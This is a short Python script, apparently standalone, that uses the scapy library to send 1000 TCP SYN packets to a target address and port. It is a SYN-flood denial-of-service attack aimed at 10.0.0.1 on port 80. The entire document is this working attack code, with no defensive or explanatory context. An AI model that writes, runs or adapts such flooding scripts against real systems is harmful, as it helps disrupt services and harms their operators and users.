from scapy.all import *

def syn_flood(dst_ip, dst_port):
    for _ in range(1000):
        ip = IP(dst=dst_ip)
        tcp = TCP(dport=dst_port, flags='S')
        packet = ip/tcp
        send(packet)

if __name__ == "__main__":
    syn_flood("10.0.0.1", 80)
